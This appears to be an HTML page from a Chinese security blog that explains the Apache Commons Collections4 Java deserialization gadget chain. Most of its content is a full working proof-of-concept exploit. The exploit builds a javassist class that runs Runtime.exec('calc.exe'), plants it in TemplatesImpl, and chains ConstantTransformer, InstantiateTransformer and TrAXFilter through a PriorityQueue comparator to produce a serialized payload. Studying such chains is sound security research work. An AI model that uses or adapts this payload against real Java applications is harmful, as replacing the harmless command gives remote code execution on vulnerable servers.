@@ -1,0 +1,291 @@
+<html>
+  <head>
+    <meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>【Java反序列化】CommonCollections4利用链 | Limpid</title>
+<link rel="shortcut icon" href="https://limpid94.github.io/favicon.ico?v=1663148874314">
+<link href="https://cdn.jsdelivr.net/npm/remixicon@2.3.0/fonts/remixicon.css" rel="stylesheet">
+<link rel="stylesheet" href="https://limpid94.github.io/styles/main.css">
+<link rel="alternate" type="application/atom+xml" title="【Java反序列化】CommonCollections4利用链 | Limpid - Atom Feed" href="https://limpid94.github.io/atom.xml">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Droid+Serif:400,700">
+
+
+
+    <meta name="description" content="调用链
+Gadget chain:
+    ObjectInputStream.readObject()
+        PriorityQueue.readObject()
+        ...
+            ChainedT..." />
+    <meta name="keywords" content="" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+    <script src="https://cdn.bootcss.com/highlight.js/9.12.0/highlight.min.js"></script>
+  </head>
+  <body>
+    <div class="main">
+      <div class="main-content">
+        <div class="site-header">
+  <a href="https://limpid94.github.io">
+  <img class="avatar" src="https://limpid94.github.io/images/avatar.png?v=1663148874314" alt="">
+  </a>
+  <h1 class="site-title">
+    Limpid
+  </h1>
+  <p class="site-description">
+    Keep thinking , keeping learning
+  </p>
+  <div class="menu-container">
+    
+      
+        <a href="/" class="menu">
+          首页
+        </a>
+      
+    
+      
+        <a href="/archives" class="menu">
+          归档
+        </a>
+      
+    
+      
+        <a href="/tags" class="menu">
+          标签
+        </a>
+      
+    
+      
+        <a href="/post/about" class="menu">
+          关于
+        </a>
+      
+    
+  </div>
+  <div class="social-container">
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+  </div>
+</div>
+
+        <div class="post-detail">
+          <article class="post">
+            <h2 class="post-title">
+              【Java反序列化】CommonCollections4利用链
+            </h2>
+            <div class="post-info">
+              <span>
+                2022-04-06
+              </span>
+              <span>
+                4 min read
+              </span>
+              
+            </div>
+            
+            <div class="post-content-wrapper">
+              <div class="post-content">
+                <h2 id="调用链">调用链</h2>
+<pre><code>Gadget chain:
+    ObjectInputStream.readObject()
+        PriorityQueue.readObject()
+        ...
+            ChainedTransformer.transform()
+                ConstantTransformer.transform()
+                    InstantiateTransformer.transform()
+                        TrAXFilter.TrAXFilter()
+                            ...
+                                exec()
+</code></pre>
+<p>CC4采用的命令执行部分同CC2、CC3，而触发部分还是和CC2的结构相类似。<br>
+CC4采用<code>ChainedTransformer+TransformingComparator</code>，而CC2采用<code>InvokerTransformer+TransformingComparator</code>，这算是细微的差别吧。</p>
+<p>【借用 https://www.anquanke.com/post/id/233393#h2-7 的图】<br>
+<img src="https://limpid94.github.io/post-images/1649227036444.png" alt="" loading="lazy"></p>
+<h2 id="poc">POC</h2>
+<pre><code class="language-java">package cc.commonscollections;
+
+import com.sun.corba.se.impl.orbutil.closure.Constant;
+import com.sun.net.httpserver.Filter;
+import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
+import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
+import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
+import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
+import javassist.ClassClassPath;
+import javassist.ClassPool;
+import javassist.CtClass;
+import javassist.CtConstructor;
+import org.apache.commons.collections4.comparators.TransformingComparator;
+import org.apache.commons.collections4.functors.ChainedTransformer;
+import org.apache.commons.collections4.functors.ConstantTransformer;
+import org.apache.commons.collections4.functors.InstantiateTransformer;
+import org.apache.commons.collections4.Transformer;
+
+import javax.xml.transform.Templates;
+import java.io.*;
+import java.lang.reflect.Field;
+import java.util.PriorityQueue;
+
+public class CommonCollections4 {
+    public static void main(String[] args) throws Exception {
+        //获取默认类池
+        ClassPool pool = ClassPool.getDefault();
+        //添加路径
+        pool.insertClassPath(new ClassClassPath(AbstractTranslet.class));
+        //创建新类
+        CtClass evil = pool.makeClass(&quot;Evil&quot;);
+        //设置类名
+        evil.setName(&quot;MyEvil&quot;);
+        //设置要继承的类
+        evil.setSuperclass(pool.get(AbstractTranslet.class.getName()));
+        //创建空的构造函数
+        CtConstructor newconstructor = evil.makeClassInitializer();
+        //将字节码插入开头
+        newconstructor.insertBefore(&quot;java.lang.Runtime.getRuntime().exec(\&quot;calc.exe\&quot;);&quot;);
+        evil.writeFile();
+
+        byte[] bytecode = evil.toBytecode();
+        byte[][] bytecodes = {bytecode};
+
+        TemplatesImpl templates = new TemplatesImpl();
+        Class templatesClass = templates.getClass();
+        Field nameField = templatesClass.getDeclaredField(&quot;_name&quot;);
+        nameField.setAccessible(true);
+        nameField.set(templates,&quot;aaa&quot;);
+
+        Field bytecodesField = templatesClass.getDeclaredField(&quot;_bytecodes&quot;);
+        bytecodesField.setAccessible(true);
+        bytecodesField.set(templates,bytecodes);
+
+        Field tfactoryField = templatesClass.getDeclaredField(&quot;_tfactory&quot;);
+        tfactoryField.setAccessible(true);
+        tfactoryField.set(templates,new TransformerFactoryImpl());
+        //++++++++++++++++++++++++++++++++代码执行部分结束+++++++++++++++++++++++++++++++++++++
+
+        Transformer[] transformers = new Transformer[]{
+                new ConstantTransformer(TrAXFilter.class),
+                new InstantiateTransformer(
+                        new Class[]{Templates.class},
+                        new Object[]{templates}
+                )
+        };
+        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
+        TransformingComparator comparator = new TransformingComparator(new ConstantTransformer(1));
+        PriorityQueue&lt;Object&gt; queue = new PriorityQueue&lt;&gt;(2,comparator);
+        queue.add(templates);
+        queue.add(&quot;hahaha&quot;);
+
+        Field cField = comparator.getClass().getDeclaredField(&quot;transformer&quot;);
+        cField.setAccessible(true);
+        cField.set(comparator ,chainedTransformer);
+//        mySeriable(queue);
+        myDeseriable(&quot;ser4.bin&quot;);
+    }
+
+    public static void mySeriable(Object obj) throws IOException {
+        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;ser4.bin&quot;));
+        oos.writeObject(obj);
+        oos.close();
+    }
+
+    public static Object myDeseriable(String s) throws IOException, ClassNotFoundException {
+        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(s));
+        return ois.readObject();
+    }
+}
+
+</code></pre>
+<h2 id="参考材料">参考材料</h2>
+<p>https://www.anquanke.com/post/id/233393#h2-7<br>
+http://myblog.ac.cn/archives/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8Bcommoncollections4%E5%88%A9%E7%94%A8%E9%93%BE<br>
+https://blog.weik1.top/2021/03/02/CommonCollections2-7%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90%E5%88%86%E6%9E%90/#CommonCollections4</p>
+
+              </div>
+              <div class="toc-container">
+                <ul class="markdownIt-TOC">
+<li>
+<ul>
+<li><a href="#%E8%B0%83%E7%94%A8%E9%93%BE">调用链</a></li>
+<li><a href="#poc">POC</a></li>
+<li><a href="#%E5%8F%82%E8%80%83%E6%9D%90%E6%96%99">参考材料</a></li>
+</ul>
+</li>
+</ul>
+
+              </div>
+            </div>
+          </article>
+        </div>
+
+        
+          <div class="next-post">
+            <div class="next">下一篇</div>
+            <a href="https://limpid94.github.io/post/java-fan-xu-lie-hua-commoncollections3-li-yong-lian/">
+              <h3 class="post-title">
+                【Java反序列化】CommonCollections3利用链
+              </h3>
+            </a>
+          </div>
+        
+
+        
+
+        <div class="site-footer">
+  Powered by Limpid .
+  <a class="rss" href="https://limpid94.github.io/atom.xml" target="_blank">
+    <i class="ri-rss-line"></i> RSS
+  </a>
+</div>
+
+      </div>
+    </div>
+
+    <script>
+      hljs.initHighlightingOnLoad()
+
+      let mainNavLinks = document.querySelectorAll(".markdownIt-TOC a");
+
+      // This should probably be throttled.
+      // Especially because it triggers during smooth scrolling.
+      // https://lodash.com/docs/4.17.10#throttle
+      // You could do like...
+      // window.addEventListener("scroll", () => {
+      //    _.throttle(doThatStuff, 100);
+      // });
+      // Only not doing it here to keep this Pen dependency-free.
+
+      window.addEventListener("scroll", event => {
+        let fromTop = window.scrollY;
+
+        mainNavLinks.forEach((link, index) => {
+          let section = document.getElementById(decodeURI(link.hash).substring(1));
+          let nextSection = null
+          if (mainNavLinks[index + 1]) {
+            nextSection = document.getElementById(decodeURI(mainNavLinks[index + 1].hash).substring(1));
+          }
+          if (section.offsetTop <= fromTop) {
+            if (nextSection) {
+              if (nextSection.offsetTop > fromTop) {
+                link.classList.add("current");
+              } else {
+                link.classList.remove("current");    
+              }
+            } else {
+              link.classList.add("current");
+            }
+          } else {
+            link.classList.remove("current");
+          }
+        });
+      });
+
+    </script>
+  </body>
+</html>
